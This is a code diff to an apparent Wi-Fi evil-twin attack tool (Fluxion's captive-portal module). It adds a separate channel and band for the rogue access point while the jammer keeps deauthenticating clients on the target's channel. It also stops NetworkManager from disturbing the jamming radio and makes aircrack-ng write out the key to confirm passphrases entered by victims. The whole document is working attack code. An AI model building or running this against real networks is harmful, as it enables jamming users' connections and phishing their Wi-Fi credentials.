@@ -159,7 +159,202 @@ captive_portal_set_ap_interface() {
       return 2
     fi
     echo "Virtual interface created successfully." >> $FLUXIONOutputDevice
+
+    # Keep NetworkManager off the freshly created virtual interface. The
+    # virtual AP interface shares a single radio (phy) with the jammer's
+    # monitor interface; if NM manages it, its periodic background scans
+    # yank that radio off the fixed channel, and airodump-ng on the monitor
+    # interface starts reporting "fixed channel <iface>: -1". Hold it down
+    # until the AP service brings it up on its own channel.
+    if [ -x "$(command -v nmcli)" ]; then
+      nmcli device set "${physicalInterface}v" managed no \
+        &>> $FLUXIONOutputDevice
+    fi
+    ip link set "${physicalInterface}v" down &>> $FLUXIONOutputDevice
+
     CaptivePortalAccessPointInterface=${physicalInterface}v
+  fi
+}
+
+# Reports whether a channel number is valid and, if the access point
+# interface's bands are known, whether that interface can operate on it.
+captive_portal_channel_supported() {
+  local channel="$1"
+  local bands="$2"
+
+  if [ "$channel" -ge 1 ] 2>/dev/null && [ "$channel" -le 14 ] 2>/dev/null; then
+    [ "$bands" = "unknown" ] && return 0
+    [[ "$bands" == *"2.4GHz"* ]] && return 0
+    return 1
+  fi
+
+  if [ "$channel" -ge 36 ] 2>/dev/null && [ "$channel" -le 177 ] 2>/dev/null; then
+    [ "$bands" = "unknown" ] && return 0
+    [[ "$bands" == *"5GHz"* ]] && return 0
+    return 1
+  fi
+
+  return 1
+}
+
+captive_portal_unset_ap_channel() {
+  if [ ! "$CaptivePortalAccessPointChannel" ]; then return 1; fi
+
+  CaptivePortalAccessPointChannel=""
+
+  # Since we auto-select when on auto, trigger the undo-chain.
+  if [ "$FLUXIONAuto" ]; then return 2; fi
+}
+
+# Lets the operator run the rogue access point on a different channel (and
+# band) than the target. The jammer always stays on the target's channel, so
+# clients can be deauthenticated on 5GHz while the evil twin is served on the
+# longer-range, less-regulated 2.4GHz band (or vice versa).
+captive_portal_set_ap_channel() {
+  if [ "$CaptivePortalAccessPointChannel" ]; then return 0; fi
+
+  captive_portal_unset_ap_channel
+
+  # Auto mode: honor --ap-channel, otherwise mirror the target's channel.
+  if [ "$FLUXIONAuto" ]; then
+    local autoChannel="${FLUXIONAPChannel:-$FluxionTargetChannel}"
+
+    # Validate against the AP interface's bands so auto mode fails loudly here
+    # (e.g. a 2.4GHz-only card asked to host a 5GHz channel) instead of dying
+    # silently at hostapd with the DHCP/web services left with no interface.
+    interface_bands "$CaptivePortalAccessPointInterface" 2>/dev/null
+    local autoBands="${InterfaceBands:-unknown}"
+    if ! captive_portal_channel_supported "$autoChannel" "$autoBands"; then
+      fluxion_conditional_bail "$CaptivePortalAPChannelUnsupportedAutoError"
+      return 2
+    fi
+
+    CaptivePortalAccessPointChannel="$autoChannel"
+    return 0
+  fi
+
+  interface_bands "$CaptivePortalAccessPointInterface" 2>/dev/null
+  local apBands="${InterfaceBands:-unknown}"
+
+  # Loop the option menu so backing out of the custom-channel entry (0)
+  # returns here instead of aborting the whole step.
+  local channelNotice=""
+  while true; do
+    fluxion_header
+
+    echo -e "$FLUXIONVLine $CaptivePortalAPChannelQuery"
+    echo
+
+    fluxion_target_show
+
+    # A guard (e.g. target band unsupported by the AP interface) leaves a
+    # notice here that persists across the screen redraw until resolved.
+    if [ "$channelNotice" ]; then
+      echo -e "$FLUXIONVLine $channelNotice"
+      echo
+    fi
+
+    local choices=(
+      "$CaptivePortalAPChannelTargetOption"
+      "$CaptivePortalAPChannelCustomOption"
+      "$FLUXIONGeneralBackOption"
+    )
+
+    io_query_choice "" choices[@]
+
+    echo
+
+    case "$IOQueryChoice" in
+      "$CaptivePortalAPChannelTargetOption")
+        # The AP interface may not support the target's band (e.g. a 2.4GHz-only
+        # card against a 5GHz target). Catch it here instead of failing later at
+        # hostapd, and steer the user to a custom channel on a supported band.
+        if ! captive_portal_channel_supported "$FluxionTargetChannel" "$apBands"; then
+          channelNotice="$CaptivePortalAPChannelUnsupportedWarning"
+          continue
+        fi
+        channelNotice=""
+        CaptivePortalAccessPointChannel="$FluxionTargetChannel"
+        break
+        ;;
+      "$CaptivePortalAPChannelCustomOption")
+        local customChannel=""
+        local channelError=""
+        local customBack=""
+        while [ ! "$customChannel" ]; do
+          # Redraw a clean screen on every attempt so this prompt matches the
+          # rest of the interface (header + target block + input examples).
+          fluxion_header
+
+          echo -e "$FLUXIONVLine $CaptivePortalAPChannelQuery"
+          echo
+
+          fluxion_target_show
+
+          echo -e "$FLUXIONVLine $CaptivePortalAPChannelCustomNotice"
+          echo
+          echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}6$CClr, ${CBlu}11$CClr (2.4GHz)"
+          echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}36$CClr, ${CBlu}149$CClr (5GHz)"
+          echo -e "     $CaptivePortalAPChannelBandsTip $CClr$apBands"
+          echo -e "${CSRed}[${CSYel}0${CSRed}]${CClr} $FLUXIONGeneralBackOption"
+          echo
+
+          if [ "$channelError" ]; then
+            echo -e "$FLUXIONVLine $CaptivePortalAPChannelInvalidError"
+            echo
+          fi
+
+          echo -ne "$FLUXIONPrompt"
+          read customChannel
+
+          # 0 returns to the channel-option menu above.
+          if [ "$customChannel" = "0" ]; then
+            customBack=1
+            break
+          fi
+
+          if ! [[ "$customChannel" =~ ^[0-9]+$ ]] || \
+            ! captive_portal_channel_supported "$customChannel" "$apBands"; then
+            channelError=1
+            customChannel=""
+          fi
+        done
+
+        # Chose to go back: re-display the option menu.
+        if [ "$customBack" ]; then continue; fi
+
+        echo
+
+        CaptivePortalAccessPointChannel="$customChannel"
+        break
+        ;;
+      "$FLUXIONGeneralBackOption")
+        captive_portal_unset_ap_channel
+        return -1
+        ;;
+      *)
+        captive_portal_unset_ap_channel
+        return 1
+        ;;
+    esac
+  done
+
+  # Warn when the chosen band differs from the target's while the jammer and
+  # access point share a single radio, which cannot cover both at once.
+  local targetChannel=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+  local apChannel=$(echo "$CaptivePortalAccessPointChannel" | grep -oE '[0-9]+' | head -1)
+  local targetIs5=0 apIs5=0
+  [ "$targetChannel" -gt 14 ] 2>/dev/null && targetIs5=1
+  [ "$apChannel" -gt 14 ] 2>/dev/null && apIs5=1
+  if [ "$targetIs5" != "$apIs5" ]; then
+    interface_physical "$CaptivePortalAccessPointInterface"
+    local apPhysical="$InterfacePhysical"
+    interface_physical "$CaptivePortalJammerInterface"
+    local jammerPhysical="$InterfacePhysical"
+    if [ "$apPhysical" ] && [ "$apPhysical" = "$jammerPhysical" ]; then
+      echo -e "$FLUXIONVLine $CaptivePortalAPChannelSharedRadioWarning"
+      sleep 5
+    fi
   fi
 }
 
@@ -204,6 +399,11 @@ function captive_portal_set_deauth_method() {
 }
 
 function captive_portal_unset_deauth_target() {
+  # Drop the cached client-scan result so the next time we land on the
+  # deauth-target step (e.g. after going back and re-picking an interface)
+  # the station scan runs again instead of reusing stale results.
+  FluxionTargetClientsScanned=""
+
   if [ ! "$CaptivePortalTargetClients" ]; then return 1; fi
   CaptivePortalTargetClients=""
 }
@@ -263,13 +463,16 @@ function captive_portal_set_ap_service() {
 
   captive_portal_unset_ap_service
 
+  local -r CaptivePortalAPChannelEffective="${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
+
   if [ "$FLUXIONAuto" ]; then
     if [ "$FLUXIONAPService" ]; then
       CaptivePortalAPService="$FLUXIONAPService"
     # DFS channels (52-64, 100-144) require airbase-ng since hostapd
-    # needs driver CAC/radar support which USB adapters lack.
-    elif [ "$FluxionTargetChannel" -ge 52 -a "$FluxionTargetChannel" -le 64 ] 2>/dev/null || \
-         [ "$FluxionTargetChannel" -ge 100 -a "$FluxionTargetChannel" -le 144 ] 2>/dev/null; then
+    # needs driver CAC/radar support which USB adapters lack. The check
+    # uses the rogue AP's channel, which may differ from the target's.
+    elif [ "$CaptivePortalAPChannelEffective" -ge 52 -a "$CaptivePortalAPChannelEffective" -le 64 ] 2>/dev/null || \
+         [ "$CaptivePortalAPChannelEffective" -ge 100 -a "$CaptivePortalAPChannelEffective" -le 144 ] 2>/dev/null; then
       CaptivePortalAPService="airbase-ng"
     else
       CaptivePortalAPService="hostapd"
@@ -391,7 +594,16 @@ captive_portal_set_authenticator() {
         "$CaptivePortalHashPath" "$FluxionTargetMAC" "$FluxionTargetSSID"
       result=$?
 
-      CaptivePortalHashPath="${FluxionHashPath:-'INVALID_PATH'}"
+      # Only cache the path once it actually resolved to a real file. On
+      # failure or back-out, clear it: leaving a non-empty bogus value here
+      # makes the next attempt (e.g. after switching verification method) skip
+      # the default-path derivation and the "use found hash" offer, dropping
+      # the user straight into the manual path prompt.
+      if [ $result -eq 0 ] && [ -f "$FluxionHashPath" ] && [ -s "$FluxionHashPath" ]; then
+        CaptivePortalHashPath="$FluxionHashPath"
+      else
+        CaptivePortalHashPath=""
+      fi
 
       if [ $result -eq 255 ] || [ $result -eq -1 ]; then
         # User backed out; bubble up so caller can show previous menu.
@@ -752,7 +964,7 @@ captive_portal_set_attack() {
       "$CaptivePortalGatewayAddress" \
       "$FluxionTargetSSID" \
       "$FluxionTargetRogueMAC" \
-      "$FluxionTargetChannel"
+      "${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
 
     CaptivePortalAccessInterface=$APServiceAccessInterface
   fi
@@ -1002,9 +1214,14 @@ while [ \$AuthenticatorState = \"running\" ]; do
 
       *)
         # Aircrack-ng
-        # Check if we've got the correct password by looking for
-        # anything other than \"Passphrase not in\" or \"KEY NOT FOUND\".
-        local -r verifiedCondition="! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -Eqi \"Passphrase not in|KEY NOT FOUND\""
+        # Confirm the candidate by having aircrack-ng WRITE the recovered
+        # key to a file (-l); the password is correct only when that file
+        # ends up non-empty. The previous check inferred success from the
+        # ABSENCE of \"KEY NOT FOUND\"/\"Passphrase not in\" in aircrack's
+        # output, which false-accepts ANY password whenever aircrack prints
+        # neither string (e.g. \"No matching network found\" when the capture
+        # holds no usable handshake). Remove any stale key first.
+        local -r verifiedCondition="rm -f \"$FLUXIONWorkspacePath/candidate.key\"; aircrack-ng -a 2 -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" -l \"$FLUXIONWorkspacePath/candidate.key\" \"$CaptivePortalHashPath\" &>> $FLUXIONOutputDevice; [ -s \"$FLUXIONWorkspacePath/candidate.key\" ]"
         ;;
     esac
     echo "
@@ -1020,12 +1237,21 @@ while [ \$AuthenticatorState = \"running\" ]; do
   fi
 
   local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
+
+  # Show the rogue AP channel separately only when it differs from the target's.
+  local -r rogueAPChannel="${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
+  local apChannelInfoLine=""
+  if [ "$rogueAPChannel" != "$FluxionTargetChannel" ]; then
+    apChannelInfoLine="    echo -e \"    AP Channel .....: ${CWht}${rogueAPChannel}${CClr}\""
+  fi
+
   echo "
     echo
     echo -e \"  ACCESS POINT:\"
     printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
     echo -e \"    MAC ............: $CYel$FluxionTargetMAC$CClr\"
     echo -e \"    Channel ........: $CWht$FluxionTargetChannel$CClr\"
+$apChannelInfoLine
     echo -e \"    Vendor .........: $CGrn${FluxionTargetMaker:-UNKNOWN}$CClr\"
     echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
     echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
@@ -1478,6 +1704,7 @@ unprep_attack() {
   captive_portal_unset_connectivity
   captive_portal_unset_certificate
   captive_portal_unset_authenticator
+  captive_portal_unset_ap_channel
   captive_portal_unset_ap_interface
   captive_portal_unset_jammer_interface
 
@@ -1491,6 +1718,7 @@ prep_attack() {
     "set_ap_interface"
     "set_deauth_method"
     "set_deauth_target"
+    "set_ap_channel"
     "set_ap_service"
     "set_authenticator"
     "set_certificate"
@@ -1534,6 +1762,9 @@ load_attack() {
   # Deauthentication target clients ("all" or a list of client MACs).
   CaptivePortalTargetClients=${configuration[11]:-broadcast}
 
+  # Rogue access point channel (may differ from the target's channel).
+  CaptivePortalAccessPointChannel=${configuration[12]}
+
   # Assure hash is relevant for fluxion's current target.
   # If the hash is no longer relevant, clear to force reset.
   if [ \
@@ -1569,6 +1800,9 @@ save_attack() {
 
   # Deauthentication target clients ("all" or a list of client MACs).
   echo "$CaptivePortalTargetClients" >> "$configurationPath"
+
+  # Rogue access point channel (may differ from the target's channel).
+  echo "$CaptivePortalAccessPointChannel" >> "$configurationPath"
 }
 
 captive_portal_stop_jammer_service() {
